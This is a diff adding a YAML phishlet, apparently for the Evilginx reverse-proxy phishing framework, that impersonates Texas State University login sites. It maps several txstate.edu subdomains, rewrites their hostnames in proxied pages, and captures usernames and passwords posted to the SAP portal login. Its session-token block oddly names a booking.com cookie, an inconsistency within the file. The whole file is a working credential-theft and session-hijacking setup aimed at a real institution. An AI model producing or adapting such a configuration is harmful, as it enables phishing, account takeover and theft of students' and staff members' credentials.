@@ -1,0 +1,88 @@
+author: '@none'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'txstate.edu', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'txstate.edu', session: true, is_landing: false}
+  - {phish_sub: 'authentic', orig_sub: 'authentic', domain: 'txstate.edu', session: true, is_landing: false}
+  - {phish_sub: 'ibis.sap', orig_sub: 'ibis.sap', domain: 'txstate.edu', session: true, is_landing: false}
+  - {phish_sub: 'tim', orig_sub: 'tim', domain: 'txstate.edu', session: true, is_landing: false}
+
+# https://www.txstate.edu/
+# https://authentic.txstate.edu/
+# https://ibis.sap.txstate.edu/
+# https://tim.txstate.edu/onlinetoolkit/Login?ProceedIdVet=True
+# https://authentic.txstate.edu:443
+
+# Location: https://authentic.txstate.edu:443/idp/profile/SAML2/Redirect/SSO?SAMLRequest=fZJda8IwFIb%2FSonXbWJsVw2tIJOBsC%2Fs2MXuYnqqgZp0OSl1%2F36p29CbCSEX4Tnhed%2BkWPX%2BYLbw2QP6aB02baTX1pTk4H2HglIZCDBeq8Sf0EsPCdQ91XVHO2cb3QKtVk%2BPnG6h1g6Up1X1QqLNuiTVnO%2BanE3nMW%2FuVJxC08SLfK5ipSDPZ3yWZ1MZUMQeNibcbXxJOOM8ZllYbywXGRdZlszz9INE7%2BDwbMYTRqLTsTVYkt4ZYSVqFEYeAYVXYtQRgRHBz1tl219YGOS3ByQiuDH9ZSL9KSL0MAxDMswS6%2FaUMzalLKUBAqMmF3r2D80oW4x0jXo%2FIcsimIhzbLf8q1nvNCYou%2BuWC3oFFs%2FBd7N%2Bta1WX9Gqbe1w7yCQJWlki0CiB%2BuO0t%2BOOJ7oOm7OqPBOGtThdQldFvT6Lyy%2FAQ%3D%3D&RelayState=oucprpkcrahm&SigAlg=http%3A%2F%2Fwww.w3.org%2F2000%2F09%2Fxmldsig%23rsa-sha1&Signature=HvRemswjbOXCF%2BrmrGgRaA4MK%2FUuBnDGLvL9nVzDan36psGmzr4bfxcpZM8bkkC8PTPsGSREzxcHYwZyNqSHZOZFDCeFlj%2F5NhSLGZDxmb9wceU1ZKDHbkG25ib0XVcdP1n1oA%2BgrxykGxFgEfiAWnIEJfCoY%2Fv7uOd%2FAhoVlddyqIWG1iV%2F3C3lrS03xJwoEFNk14hgiorNyed9pnYIaElLaA6LeKbaolWwJjrECcTb5Bo8iGmRGuGNYST97ksQUpirCxRYPL5j%2Bww8r0AvYYPw01eiFTiZjPGCmQ7Nl0jkEvYwLq1z29RSsYNkDfW8XYTBTu2VGbfjciO9rYxuNQ%3D%3D
+
+sub_filters:
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: 'authentic', domain: 'txstate.edu', search: 'https://authentic.txstate.edu:443', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: 'authentic', domain: 'txstate.edu', search: 'https%3A%2F%2Fauthentic.txstate.edu:443', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: 'authentic', domain: 'txstate.edu', search: 'authentic.txstate.edu:443', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: '', domain: 'txstate.edu', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: '', domain: 'txstate.edu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: '', domain: 'txstate.edu', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: 'www', domain: 'txstate.edu', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: 'www', domain: 'txstate.edu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: 'www', domain: 'txstate.edu', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: 'authentic', domain: 'txstate.edu', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: 'authentic', domain: 'txstate.edu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: 'authentic', domain: 'txstate.edu', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: 'ibis.sap', domain: 'txstate.edu', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: 'ibis.sap', domain: 'txstate.edu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: 'ibis.sap', domain: 'txstate.edu', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: 'tim', domain: 'txstate.edu', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: 'tim', domain: 'txstate.edu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'ibis.sap.txstate.edu', orig_sub: 'tim', domain: 'txstate.edu', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  
+  - {triggers_on: 'www.txstate.edu', orig_sub: '', domain: 'txstate.edu', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.txstate.edu', orig_sub: '', domain: 'txstate.edu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.txstate.edu', orig_sub: '', domain: 'txstate.edu', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.txstate.edu', orig_sub: 'www', domain: 'txstate.edu', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.txstate.edu', orig_sub: 'www', domain: 'txstate.edu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.txstate.edu', orig_sub: 'www', domain: 'txstate.edu', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.txstate.edu', orig_sub: 'authentic', domain: 'txstate.edu', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.txstate.edu', orig_sub: 'authentic', domain: 'txstate.edu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.txstate.edu', orig_sub: 'authentic', domain: 'txstate.edu', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.txstate.edu', orig_sub: 'ibis.sap', domain: 'txstate.edu', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.txstate.edu', orig_sub: 'ibis.sap', domain: 'txstate.edu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.txstate.edu', orig_sub: 'ibis.sap', domain: 'txstate.edu', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.txstate.edu', orig_sub: 'tim', domain: 'txstate.edu', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.txstate.edu', orig_sub: 'tim', domain: 'txstate.edu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'www.txstate.edu', orig_sub: 'tim', domain: 'txstate.edu', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+ 
+  - {triggers_on: 'authentic.txstate.edu', orig_sub: '', domain: 'txstate.edu', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'authentic.txstate.edu', orig_sub: '', domain: 'txstate.edu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'authentic.txstate.edu', orig_sub: '', domain: 'txstate.edu', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'authentic.txstate.edu', orig_sub: 'www', domain: 'txstate.edu', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'authentic.txstate.edu', orig_sub: 'www', domain: 'txstate.edu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'authentic.txstate.edu', orig_sub: 'www', domain: 'txstate.edu', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'authentic.txstate.edu', orig_sub: 'authentic', domain: 'txstate.edu', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'authentic.txstate.edu', orig_sub: 'authentic', domain: 'txstate.edu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'authentic.txstate.edu', orig_sub: 'authentic', domain: 'txstate.edu', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'authentic.txstate.edu', orig_sub: 'ibis.sap', domain: 'txstate.edu', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'authentic.txstate.edu', orig_sub: 'ibis.sap', domain: 'txstate.edu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'authentic.txstate.edu', orig_sub: 'ibis.sap', domain: 'txstate.edu', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'authentic.txstate.edu', orig_sub: 'tim', domain: 'txstate.edu', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'authentic.txstate.edu', orig_sub: 'tim', domain: 'txstate.edu', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'authentic.txstate.edu', orig_sub: 'tim', domain: 'txstate.edu', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+ 
+
+auth_tokens:
+  - domain: '.booking.com'
+    keys: ['bkng_sso_session','.*,regexp']
+
+credentials:
+  username:
+    key: 'j_username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'j_password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'ibis.sap.txstate.edu'
+  path: '/irj/portal'
